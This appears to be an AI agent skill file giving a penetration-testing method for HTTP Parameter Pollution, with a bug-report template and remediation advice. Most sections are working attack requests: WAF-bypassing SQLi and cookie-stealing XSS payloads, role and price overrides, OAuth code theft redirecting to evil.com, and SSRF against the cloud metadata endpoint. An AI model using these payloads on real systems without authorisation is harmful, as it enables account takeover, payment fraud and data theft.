---
name: hpp-hunter
description: Complete HTTP Parameter Pollution methodology — server behavior fingerprinting, server-side and client-side HPP, WAF bypass via parameter splitting, OAuth/payment/access-control abuse, header and JSON body pollution, and report structure. Use when testing whether duplicated or malformed parameters change server behavior, or to bypass a WAF or abuse logic via parameter pollution.
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["hpp", "parameter-pollution", "waf-bypass", "web", "pentest"]
---

# HPP Hunter

HTTP Parameter Pollution (HPP) exploits how different server technologies handle duplicate HTTP parameters in inconsistent ways. The same request can be interpreted differently by a WAF, a front-end proxy, and a back-end application — creating bypasses, logic flaws, and privilege escalation paths.

---

## Phase 1 — Fingerprint Parameter Handling

Before testing anything, determine how the target processes duplicate parameters. This governs every attack that follows.

### Manual fingerprint
```
GET /search?color=red&color=blue
```
Check which value appears in the response:

| Result | Behavior |
|---|---|
| Only `red` | First-wins |
| Only `blue` | Last-wins |
| `red,blue` or `red blue` | Concatenation |
| Array / both visible | Array |
| Error or unexpected | Worth digging deeper |

### Technology reference (see `references/server-behavior.md` for full table)

| Technology | Duplicate behavior |
|---|---|
| PHP / Apache | Last value wins |
| ASP.NET / IIS | All values joined with `, ` |
| JSP / Tomcat | First value wins |
| Node.js / Express | Array (`req.query.p = ['a','b']`) |
| Python / Flask | First value wins |
| Python / Django | Last value wins |
| Ruby / Rails | Last value wins |
| Go / net/http | First value wins |
| Nginx (proxy) | Passes all — back-end decides |

### Automated fingerprint
```bash
python scripts/hpp_agent.py precedence --url https://target.com/search --param q
```

---

## Phase 2 — Server-Side HPP

### 2.1 Parameter precedence abuse
If the back-end uses the last value but the WAF inspects the first:
```
GET /api/user?role=user&role=admin
POST /api/transfer
  amount=1000&account=victim&account=attacker
```

### 2.2 Payload splitting for WAF bypass
WAF inspects each parameter value independently — split the payload so no single value triggers a rule:
```
# SQLi split across two parameters (server concatenates them)
GET /search?q=1' UNION &q=SELECT password FROM users--

# XSS split
GET /search?q=<script>&q=alert(document.cookie)</script>

# Works on ASP.NET/IIS (concatenation) — verify behavior first
```

### 2.3 Security parameter override
```
# Price override (e-commerce)
POST /checkout
  item=product&price=199.99&quantity=1&price=0.01

# Role override
POST /api/update-profile
  user_id=123&role=user&role=admin

# Status override
POST /api/order
  order_id=555&status=pending&status=fulfilled
```

### 2.4 Access control bypass
Some frameworks merge parameters from different sources (query string + body). Send conflicting values:
```
GET /api/admin/delete?user_id=attacker_id
POST body: user_id=victim_id

# If server merges query + body with different precedence rules → unexpected behavior
```

---

## Phase 3 — Client-Side HPP

Client-side HPP injects parameters into URLs that the application reflects into links, forms, or API calls — then sends to other users or services.

### 3.1 URL-encoded parameter injection
The `%26` (`&`) in a value gets reflected into a link as a real `&`, injecting a new parameter:
```
# Application builds: <a href="/share?url=USER_INPUT">
# Inject:
GET /page?url=https://legit.com%26utm_source=evil%26redirect=https://evil.com

# Application renders:
<a href="/share?url=https://legit.com&utm_source=evil&redirect=https://evil.com">
```

### 3.2 OAuth redirect_uri injection
```
GET /oauth/authorize?
  client_id=app&
  redirect_uri=https://legit.com/callback&
  redirect_uri=https://evil.com/steal&
  response_type=code

# If the server uses the last redirect_uri → auth code sent to attacker
```

### 3.3 Social sharing / callback URL injection
```
GET /share?url=https://news.example.com%26callback=https://evil.com/capture
GET /webhook/register?endpoint=https://legit.com%26endpoint=https://evil.com
```

### 3.4 Link injection via reflected params
```
# If the app reflects params into hrefs:
GET /invite?next=https://app.com/dashboard%26admin=true

# Rendered as:
<a href="https://app.com/dashboard&admin=true">Continue</a>
```

---

## Phase 4 — WAF Bypass via HPP

### 4.1 Duplicate parameter bypass
```
# WAF blocks: id=1' OR '1'='1
# HPP bypass (first-wins WAF, last-wins back-end):
GET /api/user?id=1&id=1' OR '1'='1

# HPP bypass (last-wins WAF, first-wins back-end):
GET /api/user?id=1' OR '1'='1&id=1
```

### 4.2 Array syntax bypass
```
GET /search?q[]=safe&q[]=<script>alert(1)</script>
POST body: id[]=1&id[]=1 OR 1=1
```

### 4.3 Encoding variations
```
id=1%26admin%3Dtrue          → URL-encoded & and = inside value
id=1%00&admin=true           → Null byte before real separator
search=safe%0d%0aX-Admin:true → CRLF header injection via param
```

### 4.4 Automated WAF bypass test
```bash
python scripts/hpp_agent.py waf \
  --url https://target.com/search \
  --param q \
  --value "' OR '1'='1"
```

---

## Phase 5 — Header & Body Pollution

### 5.1 HTTP header pollution
Duplicate headers are handled inconsistently by proxies, load balancers, and back-ends:
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: attacker-ip

# If back-end trusts last X-Forwarded-For and proxy forwards both →
# IP allowlist bypass, rate limit bypass
```

Other high-value headers to duplicate:
```
X-Original-URL: /
X-Original-URL: /admin

Host: legit.com
Host: internal.service

X-HTTP-Method-Override: GET
X-HTTP-Method-Override: DELETE
```

### 5.2 JSON body pollution
Some parsers use the last key, others the first — behavior mirrors server tech:
```json
{"user_id": 123, "role": "user", "role": "admin"}
{"price": 99.99, "price": 0.01}
```

Test with both orderings and compare responses.

### 5.3 Multipart / mixed-source pollution
Some frameworks merge parameters from query string and body with different precedence:
```
GET /api/transfer?to_account=attacker
POST body: to_account=victim&amount=1000

# If query takes precedence over body → transfer goes to attacker
```

---

## Phase 6 — High-Value Attack Scenarios

### OAuth token theft
```
# Provider uses last redirect_uri, validator checks first → attacker gets code
/oauth/authorize?client_id=X&redirect_uri=https://legit.com&redirect_uri=https://evil.com
```

### Payment bypass
```
POST /checkout
  product_id=1&price=999&currency=USD&price=0.01
  # If processor uses last price → charged $0.01
```

### Coupon stacking
```
POST /apply-discount
  code=SAVE10&code=SAVE50&code=FREE100
  # If all codes applied → unintended discount
```

### Privilege escalation
```
POST /api/register
  username=alice&role=user&role=admin
  # If last value used for role assignment
```

### SSRF via HPP
Combine with SSRF-prone parameters:
```
GET /proxy?url=https://legit.com&url=http://169.254.169.254/latest/meta-data/
```

---

## Phase 7 — Automation

```bash
pip install requests

# Fingerprint how the server handles duplicate parameters
python scripts/hpp_agent.py precedence --url https://target.com/api/search --param q

# Run full HPP payload suite (GET or POST)
python scripts/hpp_agent.py test --url https://target.com/api/search --method GET
python scripts/hpp_agent.py test --url https://target.com/api/action --method POST

# Test WAF bypass with a known-blocked payload
python scripts/hpp_agent.py waf --url https://target.com/search --param q --value "' OR 1=1--"
```

---

## Phase 8 — Report Structure

```
Title: HTTP Parameter Pollution on [endpoint] allows [WAF bypass / privilege escalation / payment manipulation]

Severity: [Critical / High / Medium]

Affected endpoint: [METHOD] [URL]

Server behavior: [first-wins / last-wins / concatenation / array]

Steps to reproduce:
1. Send: [exact HTTP request with duplicate parameters]
2. Observe: [what the server returned vs. expected behavior]

Impact:
- [e.g. "WAF SQLi rule bypassed — attacker can enumerate the users table"]
- [e.g. "Price parameter overridden — item purchased for $0.01"]

Evidence:
- Baseline request: [normal request and response]
- HPP request: [duplicate-param request and anomalous response]

Remediation:
- Reject requests containing duplicate parameter names at the input layer
- If duplicates must be accepted, enforce strict first-occurrence-only policy consistently across all layers
- Ensure WAF and back-end use identical parameter parsing logic
- Validate all security-critical parameters (role, price, redirect_uri) server-side after merging
```

---

## Quick Priority Order

1. **OAuth redirect_uri** — auth code theft, Critical if exploitable
2. **Payment / pricing parameters** — direct financial impact
3. **Role / permission parameters** — privilege escalation
4. **WAF bypass** — enables chaining with SQLi/XSS that were previously blocked
5. **X-Forwarded-For / Host header duplication** — IP bypass, routing abuse
6. **Client-side reflected HPP** — lower severity, needs victim interaction
